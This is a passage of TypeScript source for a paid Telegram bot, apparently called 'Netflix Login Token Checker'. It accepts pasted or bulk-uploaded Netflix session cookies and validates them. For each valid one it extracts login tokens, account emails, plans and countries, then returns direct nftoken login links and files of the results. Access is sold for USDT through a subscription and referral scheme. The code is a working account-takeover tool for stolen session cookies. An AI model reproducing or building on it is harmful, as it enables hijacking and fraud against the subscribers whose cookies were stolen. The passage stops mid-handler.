      await bot.sendMessage(chatId,
        `🔑 <b>Token Result</b> ${badge}\n${"─".repeat(25)}\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n${emailLine}\n🔑 <code>${esc(result.token)}</code>\n\n📱 <b>Mobile:</b> <a href="https://netflix.com/unsupported?nftoken=${esc(result.token)}">Login (Mobile)</a>\n💻 <b>PC:</b> <a href="https://netflix.com/account?nftoken=${esc(result.token)}">Login (PC)</a>\n\n<i>by @ghost5698</i>`,
        { parse_mode: "HTML", disable_web_page_preview: true }
      );
    } else {
      storage.addDead(String(userId));
      await bot.sendMessage(chatId, `❌ <b>Dead/Invalid cookie</b>\n${esc(result.error || "No token found")}`, { parse_mode: "HTML" });
    }
  });

  bot.onText(/\/ck2(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const username = msg.from?.username || "";
    const firstName = msg.from?.first_name || "";
    storage.getOrCreateUser(String(userId), username, firstName);

    if (storage.isBanned(String(userId))) return;

    const rawCookie = (match?.[1] || "").trim();
    if (!rawCookie) {
      return bot.sendMessage(chatId,
        `📖 <b>Usage:</b> <code>/ck2 NetflixIDValue</code>\n\nExample:\n<code>/ck2 eyJhbGciOiJSUzI1NiJ9...</code>`,
        { parse_mode: "HTML" }
      );
    }

    const access = storage.hasAccess(String(userId), OWNER_ID);
    if (!access.allowed) {
      return bot.sendMessage(chatId, noAccessMessage(), {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }]] }
      });
    }
    if (access.usedToken) {
      await bot.sendMessage(chatId, `🎟️ Used 1 token. Remaining: ${storage.getTokens(String(userId))}`);
    }

    const cookie = cleanCookie(rawCookie);
    const statusMsg = await bot.sendMessage(chatId, `🔴 Running full check...`, { parse_mode: "HTML" });
    const result = await checkNetflixCookie(cookie);
    storage.addDailyChecks(String(userId), 1);

    try { await bot.deleteMessage(chatId, statusMsg.message_id); } catch {}

    if (result.success && result.token) {
      storage.addHit(String(userId));
      await bot.sendMessage(chatId, formatNFHit(result, 1), { parse_mode: "HTML", disable_web_page_preview: true });
    } else {
      storage.addDead(String(userId));
      await bot.sendMessage(chatId, `❌ <b>Dead/Invalid cookie</b>\n${esc(result.error || "No token found")}`, { parse_mode: "HTML" });
    }
  });

  bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    await bot.sendMessage(chatId,
      `📚 <b>All Commands</b>\n${"─".repeat(30)}\n\n` +
      `<b>🔍 Checking:</b>\n` +
      `▫️ /ck <code>NetflixID</code> — Token only (fast)\n` +
      `▫️ /ck2 <code>NetflixID</code> — Full details\n\n` +
      `<b>💎 Subscription:</b>\n` +
      `▫️ /plan — View Elite plan & pricing\n` +
      `▫️ /paid — Mark payment as sent\n\n` +
      `<b>👤 Account:</b>\n` +
      `▫️ /ref — Your referral link\n` +
      `▫️ /tokens — Check your token balance\n` +
      `▫️ /cancel — Cancel current check\n\n` +
      `<b>🔑 How it works:</b>\n` +
      `• New users get <b>3 free tokens</b>\n` +
      `• 1 token = 1 check session\n` +
      `• Refer a friend = +3 tokens\n` +
      `• Elite = unlimited checks ($5/mo)\n\n` +
      `<b>📊 Quality Badges:</b>\n` +
      `🥇 Premium / Premium+\n` +
      `🥈 Standard\n` +
      `🥉 Basic\n` +
      `🎯 Active (unknown plan)\n\n` +
      `<i>Powered by @ghost5698</i>`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] } }
    );
  });

  bot.onText(/\/ping/, async (msg) => {
    const start = Date.now();
    const sentMsg = await bot.sendMessage(msg.chat.id, "🏓 Pinging...");
    const latency = Date.now() - start;
    await bot.editMessageText(
      `🏓 <b>Pong!</b>\n⚡ Latency: <b>${latency}ms</b>\n✅ Bot is online`,
      { chat_id: msg.chat.id, message_id: sentMsg.message_id, parse_mode: "HTML" }
    );
  });

  bot.onText(/\/profile/, async (msg) => {
    if (!msg.from || msg.chat.type !== "private") return;
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const u = storage.getUser(String(userId));
    if (!u) {
      return bot.sendMessage(chatId, "❌ Profile not found. Send /start first.");
    }
    await bot.sendMessage(chatId, buildProfileText(u, storage, String(userId), getRoleLabel(String(userId))), {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "🔗 Referral Link", callback_data: "referral" }, { text: "🎟️ Tokens", callback_data: "tokens" }], [{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
    });
  });

  bot.onText(/\/cancel/, async (msg) => {
    const userId = msg.from!.id;
    if (pending[userId]) {
      cancelled.add(userId);
      delete pending[userId];
      await bot.sendMessage(msg.chat.id, "⛔ Cancelled.", {
        reply_markup: { inline_keyboard: mainMenu() }
      });
    }
  });

  bot.onText(/\/admin/, async (msg) => {
    if (!isOwner(msg.from!.id)) return;
    await bot.sendMessage(msg.chat.id,
      `🛡️ <b>Admin Panel</b>\n${"─".repeat(30)}`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: adminMenu() } }
    );
  });

  bot.onText(/\/grant (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const targetId = match![1].trim();
    storage.grantElite(targetId, 30);
    await bot.sendMessage(msg.chat.id, `✅ Elite access granted to ${targetId} for 30 days.`);
    try {
      await bot.sendMessage(Number(targetId),
        `🎉 <b>Elite Access Granted!</b>\n\nYou now have <b>30 days</b> of unlimited access!\n\nEnjoy all features! 🔑`,
        { parse_mode: "HTML" }
      );
    } catch {}
  });

  bot.onText(/\/extend (\d+)\s+(\d+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const targetId = match![1];
    const days = parseInt(match![2]);
    storage.extendElite(targetId, days);
    await bot.sendMessage(msg.chat.id, `✅ Extended elite access for ${targetId} by ${days} days.`);
    try {
      await bot.sendMessage(Number(targetId),
        `🎉 <b>Elite Extended!</b>\n\nYour access has been extended by <b>${days} days</b>!`,
        { parse_mode: "HTML" }
      );
    } catch {}
  });

  bot.onText(/\/revoke (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    const targetId = match![1].trim();
    storage.revokeElite(targetId);
    await bot.sendMessage(msg.chat.id, `✅ Elite access revoked from ${targetId}.`);
  });

  bot.onText(/\/pending/, async (msg) => {
    if (!isOwner(msg.from!.id)) return;
    const pendingUsers = storage.getPendingUsers();
    if (pendingUsers.length === 0) {
      return bot.sendMessage(msg.chat.id, "No pending payments.");
    }
    let text = `📋 <b>Pending Payments (${pendingUsers.length})</b>\n${"─".repeat(30)}\n\n`;
    pendingUsers.forEach(u => {
      text += `• ${esc(u.firstName)} (@${esc(u.username || "N/A")}) — ID: <code>${u.telegramId}</code>\n  /grant ${u.telegramId}\n\n`;
    });
    await bot.sendMessage(msg.chat.id, text, { parse_mode: "HTML" });
  });

  bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.banUser(match![1]);
    await bot.sendMessage(msg.chat.id, `⛔ Banned user ${match![1]}`);
  });

  bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!isOwner(msg.from!.id)) return;
    storage.unbanUser(match![1]);
    await bot.sendMessage(msg.chat.id, `✅ Unbanned user ${match![1]}`);
  });

  bot.on("callback_query", async (query) => {
    const chatId = query.message!.chat.id;
    const userId = query.from.id;
    const data = query.data!;

    await bot.answerCallbackQuery(query.id).catch(() => {});

    if (data === "cancel_check") {
      cancelled.add(userId);
      return;
    }

    if (data.startsWith("act_") || data.startsWith("acf_")) {
      const isToken = data.startsWith("act_");
      const ackId = data.substring(4);
      const cookie = autocheckCookies[ackId];
      if (!cookie) {
        return bot.sendMessage(chatId, "⏰ This check expired. Please paste your cookie again.");
      }
      delete autocheckCookies[ackId];

      const access = storage.hasAccess(String(userId), OWNER_ID);
      if (!access.allowed) {
        return bot.sendMessage(chatId, noAccessMessage(), {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }]] }
        });
      }
      if (access.usedToken) {
        await bot.sendMessage(chatId, `🎟️ Used 1 token. Remaining: ${storage.getTokens(String(userId))}`);
      }

      const statusMsg = await bot.sendMessage(chatId, isToken ? `🔑 Checking token...` : `🔴 Running full check...`, { parse_mode: "HTML" });
      const result = await checkNetflixCookie(cookie);
      storage.addDailyChecks(String(userId), 1);
      try { await bot.deleteMessage(chatId, statusMsg.message_id); } catch {}

      if (result.success && result.token) {
        storage.addHit(String(userId));
        if (isToken) {
          const flag = getCountryFlag(result.country || "");
          const badge = getQualityBadge(result.plan || "", result.country || "");
          const emailLine = result.email ? `📧 <b>Email:</b> <code>${esc(result.email)}</code>\n` : "";
          await bot.sendMessage(chatId,
            `🔑 <b>Token Result</b> ${badge}\n${"─".repeat(25)}\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n${emailLine}\n🔑 <code>${esc(result.token)}</code>\n\n📱 <b>Mobile:</b> <a href="https://netflix.com/unsupported?nftoken=${esc(result.token)}">Login (Mobile)</a>\n💻 <b>PC:</b> <a href="https://netflix.com/account?nftoken=${esc(result.token)}">Login (PC)</a>\n\n<i>by @ghost5698</i>`,
            { parse_mode: "HTML", disable_web_page_preview: true }
          );
        } else {
          await bot.sendMessage(chatId, formatNFHit(result, 1), { parse_mode: "HTML", disable_web_page_preview: true });
        }
      } else {
        storage.addDead(String(userId));
        await bot.sendMessage(chatId, `❌ <b>Dead/Invalid cookie</b>\n${esc(result.error || "No token found")}`, { parse_mode: "HTML" });
      }
      return;
    }

    if (data.startsWith("grant_") && isOwner(userId)) {
      const targetId = data.substring(6);
      storage.grantElite(targetId, 30);
      await bot.sendMessage(chatId, `✅ Elite access granted to ${targetId} for 30 days.`);
      try {
        await bot.sendMessage(Number(targetId),
          `🎉 <b>Elite Access Granted!</b>\n\nYou now have <b>30 days</b> of unlimited access!\n\nEnjoy all features! 🔑`,
          { parse_mode: "HTML" }
        );
      } catch {}
      return;
    }

    if (data.startsWith("reject_") && isOwner(userId)) {
      const targetId = data.substring(7);
      storage.clearPending(targetId);
      await bot.sendMessage(chatId, `❌ Payment rejected for ${targetId}.`);
      try {
        await bot.sendMessage(Number(targetId),
          `❌ <b>Payment Not Verified</b>\n\nYour payment could not be verified.\nPlease contact @ghost5698 for support.`,
          { parse_mode: "HTML" }
        );
      } catch {}
      return;
    }

    if (data === "check_joined") {
      const ok = await checkAllChannels(userId);
      if (!ok) return sendJoinMessage(chatId);
      const username = query.from.username || "";
      const firstName = query.from.first_name || "";
      storage.getOrCreateUser(String(userId), username, firstName);
      const role = getRoleLabel(String(userId));
      return bot.sendMessage(chatId,
        `🔑 <b>Netflix Login Token Checker</b>\n${"─".repeat(30)}\n\n${role}\n\nChoose an option:`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
      );
    }

    if (data === "main_menu") {
      return bot.sendMessage(chatId,
        `🔑 <b>Netflix Login Token Checker</b>\n${"─".repeat(30)}\n\nChoose an option:`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
      );
    }

    if (storage.isBanned(String(userId))) {
      return bot.sendMessage(chatId, "⛔ You are banned from using this bot.");
    }

    if (data === "mark_paid") {
      const username = query.from.username || "";
      const firstName = query.from.first_name || "";
      storage.getOrCreateUser(String(userId), username, firstName);
      storage.setPending(String(userId));
      await bot.sendMessage(chatId,
        `✅ <b>Payment Marked!</b>\n\nYour request has been sent to the owner.\nPlease wait for verification.\n\n📞 Contact @ghost5698 if needed.`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] } }
      );
      try {
        await bot.sendMessage(Number(OWNER_ID),
          `💰 <b>New Payment!</b>\n\n👤 ${esc(firstName)} (@${esc(username || "N/A")})\n🆔 <code>${userId}</code>\n\n/grant ${userId}`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: `✅ Grant`, callback_data: `grant_${userId}` }, { text: `❌ Reject`, callback_data: `reject_${userId}` }]] } }
        );
      } catch {}
      return;
    }

    if (data === "plan") {
      let text = `💎 <b>Elite Subscription Plan</b>\n${"─".repeat(30)}\n\n`;
      text += `💰 <b>Price:</b> $5 / month\n`;
      text += `💳 <b>Payment:</b> USDT (BEP20 / Binance)\n\n`;
      text += `📋 <b>USDT Address:</b>\n<code>${USDT_ADDRESS}</code>\n\n`;
      text += `⭐ <b>Elite Benefits:</b>\n`;
      text += `• ♾️ Unlimited Netflix checks\n`;
      text += `• 🔑 Token extraction\n`;
      text += `• 🔴 Full account details\n`;
      text += `• 📊 BIN lookup\n\n`;
      text += `📩 After payment, click "I've Paid"\n`;
      text += `📞 Contact: @ghost5698`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "💵 I've Paid", callback_data: "mark_paid" }], [{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "nf_token") {
      const config = storage.getConfig();
      if (config.netflixLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Netflix is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      if (!storage.checkAccessWithoutConsuming(String(userId), OWNER_ID)) {
        return bot.sendMessage(chatId, noAccessMessage(), {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }], [{ text: "🔙 Menu", callback_data: "main_menu" }]] }
        });
      }

      pending[userId] = { action: "nf_token_only" };
      return bot.sendMessage(chatId,
        `🔑 <b>NF Token Generator</b>\n${"─".repeat(30)}\n\n📋 Send Netflix cookies (NetflixId values)\n\n🔑 This mode extracts <b>only the login token</b> — fast and simple!\n\n📝 <b>Format:</b>\n• One cookie per line\n• 📄 File (.txt, .csv, .json)\n• 📦 .zip archive\n\n💡 Send cookies now or /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "nf_checker") {
      const config = storage.getConfig();
      if (config.netflixLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, "🔒 Netflix is currently locked by admin.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        });
      }

      if (!storage.checkAccessWithoutConsuming(String(userId), OWNER_ID)) {
        return bot.sendMessage(chatId, noAccessMessage(), {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }], [{ text: "🔙 Menu", callback_data: "main_menu" }]] }
        });
      }

      pending[userId] = { action: "nf_check" };
      return bot.sendMessage(chatId,
        `🔴 <b>Netflix Full Checker</b>\n${"─".repeat(30)}\n\n📋 Send Netflix cookies (NetflixId values)\n\n🔍 Full check: token + plan + email + country + BIN + more!\n\n📝 <b>Format:</b>\n• One cookie per line\n• 📄 File (.txt, .csv, .json)\n• 📦 .zip archive\n\n💡 Send cookies now or /cancel`,
        { parse_mode: "HTML" }
      );
    }

    if (data === "help") {
      let text = `📚 <b>All Commands</b>\n${"─".repeat(30)}\n\n`;
      text += `<b>🔍 Checking:</b>\n`;
      text += `▫️ /ck <code>NetflixID</code> — Token only (fast)\n`;
      text += `▫️ /ck2 <code>NetflixID</code> — Full details\n\n`;
      text += `<b>💎 Subscription:</b>\n`;
      text += `▫️ /plan — View Elite plan & pricing\n`;
      text += `▫️ /paid — Mark payment as sent\n\n`;
      text += `<b>👤 Account:</b>\n`;
      text += `▫️ /ref — Your referral link\n`;
      text += `▫️ /tokens — Check your token balance\n`;
      text += `▫️ /ping — Check bot status\n`;
      text += `▫️ /cancel — Cancel current check\n\n`;
      text += `<b>🔑 How it works:</b>\n`;
      text += `• New users get <b>3 free tokens</b>\n`;
      text += `• 1 token = 1 check session\n`;
      text += `• Refer a friend = +3 tokens\n`;
      text += `• Elite = unlimited checks ($5/mo)\n\n`;
      text += `<b>📊 Quality Badges:</b>\n`;
      text += `🥇 Premium / Premium+\n🥈 Standard\n🥉 Basic\n🎯 Active\n\n`;
      text += `<i>Powered by @ghost5698</i>`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "profile") {
      const u = storage.getUser(String(userId));
      if (!u) {
        return bot.sendMessage(chatId, "❌ Profile not found. Send /start first.");
      }
      return bot.sendMessage(chatId, buildProfileText(u, storage, String(userId), getRoleLabel(String(userId))), {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔗 Referral Link", callback_data: "referral" }, { text: "🎟️ Tokens", callback_data: "tokens" }], [{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "referral") {
      const u = storage.getUser(String(userId));
      const refLink = `https://t.me/${botUsername}?start=ref_${userId}`;
      let text = `🔗 <b>Your Referral Link</b>\n${"─".repeat(30)}\n\n`;
      text += `<code>${refLink}</code>\n\n`;
      text += `👥 <b>Total Referrals:</b> ${u?.referralCount || 0}\n`;
      text += `🎟️ <b>Your Tokens:</b> ${u?.tokens || 0}\n\n`;
      text += `🎁 Each referral = <b>+3 tokens</b>\n`;
      text += `🎟️ 1 token = 1 free check\n`;
      text += `📊 Max tokens: 3`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
      });
    }

    if (data === "tokens") {
      const tokens = storage.getTokens(String(userId));
      return bot.sendMessage(chatId,
        `🎟️ <b>Your Tokens:</b> ${tokens}\n\n1 token = 1 free check\nEarn tokens by referring friends!\n\n🔗 Use the Referral Link button to share.`,
        { parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "🔗 Referral Link", callback_data: "referral" }], [{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
        }
      );
    }

    if (data === "admin_panel" || data === "admin_back") {
      if (!isOwner(userId)) return;
      return bot.sendMessage(chatId, `🛡️ <b>Admin Panel</b>\n${"─".repeat(30)}`, {
        parse_mode: "HTML", reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (data === "admin_stats") {
      if (!isOwner(userId)) return;
      const stats = storage.getStats();
      return bot.sendMessage(chatId,
        `📊 <b>Bot Statistics</b>\n${"─".repeat(30)}\n\n👥 Total Users: ${stats.totalUsers}\n📊 Checks Today: ${stats.checksToday}\n⭐ Elite Members: ${stats.eliteMembers}\n🚫 Banned: ${stats.bannedUsers}\n👥 Referrals: ${stats.totalReferrals}\n💰 Pending Payments: ${stats.pendingPayments}`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] } }
      );
    }

    if (data === "admin_elite") {
      if (!isOwner(userId)) return;
      const allUsers = storage.getAllUsers();
      const elites = allUsers.filter(u => storage.isEliteActive(u.telegramId));
      if (elites.length === 0) {
        return bot.sendMessage(chatId, "No elite members.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
        });
      }
      let text = `⭐ <b>Elite Members (${elites.length})</b>\n${"─".repeat(30)}\n\n`;
      elites.forEach(v => {
        const exp = v.expiry ? new Date(v.expiry).toLocaleDateString() : "Permanent";
        text += `• ${esc(v.firstName)} (@${esc(v.username || "N/A")}) — ${v.telegramId}\n  Expires: ${exp}\n\n`;
      });
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }

    if (data === "admin_pending") {
      if (!isOwner(userId)) return;
      const pendingUsers = storage.getPendingUsers();
      if (pendingUsers.length === 0) {
        return bot.sendMessage(chatId, "No pending payments.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
        });
      }
      let text = `📋 <b>Pending Payments (${pendingUsers.length})</b>\n${"─".repeat(30)}\n\n`;
      const buttons: TelegramBot.InlineKeyboardButton[][] = [];
      pendingUsers.forEach(u => {
        text += `• ${esc(u.firstName)} (@${esc(u.username || "N/A")}) — <code>${u.telegramId}</code>\n\n`;
        buttons.push([
          { text: `✅ Grant ${u.firstName}`, callback_data: `grant_${u.telegramId}` },
          { text: `❌ Reject`, callback_data: `reject_${u.telegramId}` }
        ]);
      });
      buttons.push([{ text: "🔙 Admin", callback_data: "admin_back" }]);
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML", reply_markup: { inline_keyboard: buttons }
      });
    }

    if (data === "admin_lock_nf") {
      if (!isOwner(userId)) return;
      storage.setNetflixLocked(true);
      return bot.sendMessage(chatId, "🔒 Netflix locked.", { reply_markup: { inline_keyboard: adminMenu() } });
    }
    if (data === "admin_unlock_nf") {
      if (!isOwner(userId)) return;
      storage.setNetflixLocked(false);
      return bot.sendMessage(chatId, "🔓 Netflix unlocked.", { reply_markup: { inline_keyboard: adminMenu() } });
    }

    if (data === "admin_broadcast") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_broadcast" };
      return bot.sendMessage(chatId, "📢 Send the broadcast message:");
    }

    if (data === "admin_ban_prompt") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_ban" };
      return bot.sendMessage(chatId, "Send user ID to ban:");
    }

    if (data === "admin_unban_prompt") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_unban" };
      return bot.sendMessage(chatId, "Send user ID to unban:");
    }

    if (data === "admin_banned") {
      if (!isOwner(userId)) return;
      const allUsers = storage.getAllUsers();
      const banned = allUsers.filter(u => u.isBanned);
      if (banned.length === 0) {
        return bot.sendMessage(chatId, "No banned users.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
        });
      }
      let text = `🚫 <b>Banned Users (${banned.length})</b>\n${"─".repeat(30)}\n\n`;
      banned.forEach(b => {
        text += `• ${esc(b.firstName)} (@${esc(b.username || "N/A")}) — ${b.telegramId}\n`;
      });
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }

    if (data === "admin_users") {
      if (!isOwner(userId)) return;
      const allUsers = storage.getAllUsers();
      let text = `👥 <b>All Users (${allUsers.length})</b>\n${"─".repeat(30)}\n\n`;
      const show = allUsers.slice(0, 50);
      show.forEach(u => {
        const elite = storage.isEliteActive(u.telegramId) ? "⭐" : "";
        const banned = u.isBanned ? "🚫" : "";
        const pend = u.pending ? "💰" : "";
        text += `${elite}${banned}${pend} ${esc(u.firstName)} (@${esc(u.username || "N/A")}) — ${u.telegramId}\n`;
      });
      if (allUsers.length > 50) text += `\n... and ${allUsers.length - 50} more`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }
  });

  bot.on("message", async (msg) => {
    if (!msg.from || msg.chat.type !== "private") return;
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = msg.text || "";

    if (text.startsWith("/")) return;

    const userPending = pending[userId];

    if (!userPending && !msg.document && text.length >= 20) {
      const cleaned = cleanCookie(text.trim());
      const looksLikeCookie = cleaned.length >= 20 && !cleaned.includes(" ") && !cleaned.includes("\n");
      if (looksLikeCookie && storage.getUser(String(userId))) {
        const ackId = `${userId}_${Date.now()}`;
        autocheckCookies[ackId] = cleaned;
        setTimeout(() => { delete autocheckCookies[ackId]; }, 5 * 60 * 1000);
        return bot.sendMessage(chatId,
          `🍪 <b>Cookie detected!</b>\n\nWhich check do you want to run?\n\n<code>${esc(cleaned.substring(0, 40))}...</code>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "🔑 Token Only (fast)", callback_data: `act_${ackId}` },
                  { text: "🔴 Full Check", callback_data: `acf_${ackId}` }
                ],
                [{ text: "❌ Dismiss", callback_data: "main_menu" }]
              ]
            }
          }
        );
      }
    }

    if (!userPending) return;

    if (userPending.action === "admin_broadcast" && isOwner(userId)) {
      const allUsers = storage.getAllUsers();
      let sent = 0;
      for (const u of allUsers) {
        try {
          await bot.sendMessage(Number(u.telegramId), text, { parse_mode: "HTML" });
          sent++;
        } catch {}
      }
      delete pending[userId];
      return bot.sendMessage(chatId, `📢 Broadcast sent to ${sent}/${allUsers.length} users.`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "admin_ban" && isOwner(userId)) {
      storage.banUser(text.trim());
      delete pending[userId];
      return bot.sendMessage(chatId, `⛔ Banned user ${text.trim()}`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "admin_unban" && isOwner(userId)) {
      storage.unbanUser(text.trim());
      delete pending[userId];
      return bot.sendMessage(chatId, `✅ Unbanned user ${text.trim()}`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "nf_token_only") {
      const access = storage.hasAccess(String(userId), OWNER_ID);
      if (!access.allowed) {
        delete pending[userId];
        return bot.sendMessage(chatId, noAccessMessage(), {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }], [{ text: "🔙 Menu", callback_data: "main_menu" }]] }
        });
      }

      let cookieText = "";
      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

      const cookies = parseCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      if (access.usedToken) {
        await bot.sendMessage(chatId, `🎟️ Used 1 token. Remaining: ${storage.getTokens(String(userId))}`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔑 Generating tokens for <b>${cookies.length}</b> cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let stopped = false;
      const tokenHits: { token: string; country: string; plan: string; loginUrl: string; email: string }[] = [];

      for (let i = 0; i < cookies.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔑 Generating... ${i}/${cookies.length}\n\n✅ Tokens: ${hits} | ❌ Dead: ${dead}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkNetflixCookie(cookies[i]);
          if (result.success && result.token) {
            hits++;
            const flag = getCountryFlag(result.country || "");
            const loginUrl = result.loginUrl || `https://netflix.com/account?nftoken=${result.token}`;
            tokenHits.push({ token: result.token, country: result.countryName || "Unknown", plan: result.plan || "Unknown", loginUrl, email: result.email || "" });
            const emailLine = result.email ? `📧 <b>Email:</b> <code>${esc(result.email)}</code>\n` : "";
            await bot.sendMessage(chatId,
              `🔑 <b>Token #${hits}</b>\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n${emailLine}\n🔑 <code>${esc(result.token)}</code>\n\n📱 <b>Mobile:</b> <a href="https://netflix.com/unsupported?nftoken=${esc(result.token)}">Login (Mobile)</a>\n💻 <b>PC:</b> <a href="https://netflix.com/account?nftoken=${esc(result.token)}">Login (PC)</a>\n\n<i>by @ghost5698</i>`,
              { parse_mode: "HTML", disable_web_page_preview: true }
            );
          } else {
            dead++;
          }
        } catch { dead++; }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead : cookies.length);
      for (let i = 0; i < hits; i++) storage.addHit(String(userId));
      for (let i = 0; i < dead; i++) storage.addDead(String(userId));

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Token Generation Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead}/${cookies.length}\n🔑 Tokens: ${hits}\n❌ Dead: ${dead}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      if (tokenHits.length > 0) {
        let fileContent = `NF Tokens - ${new Date().toLocaleString()}\nGenerated by @ghost5698\n${"═".repeat(40)}\n\n`;
        tokenHits.forEach((t, i) => {
          fileContent += `═══ Token #${i + 1} ═══\nCountry: ${t.country}\nPlan: ${t.plan}\n${t.email ? `Email: ${t.email}\n` : ""}Token: ${t.token}\nMobile: https://netflix.com/unsupported?nftoken=${t.token}\nPC: https://netflix.com/account?nftoken=${t.token}\n\n`;
        });
        fileContent += `${"═".repeat(40)}\nTotal Tokens: ${tokenHits.length}\nGenerated by @ghost5698`;
        const buf = Buffer.from(fileContent, "utf8");
        await bot.sendDocument(chatId, buf, { caption: `🔑 ${tokenHits.length} NF Tokens | by @ghost5698` }, { filename: `nf_tokens_${Date.now()}.txt`, contentType: "text/plain" });
      }

      delete pending[userId];
      return;
    }

    if (userPending.action === "nf_check") {
      const access = storage.hasAccess(String(userId), OWNER_ID);
      if (!access.allowed) {
        delete pending[userId];
        return bot.sendMessage(chatId, noAccessMessage(), {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }], [{ text: "🔙 Menu", callback_data: "main_menu" }]] }
        });
      }

      let cookieText = "";
      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

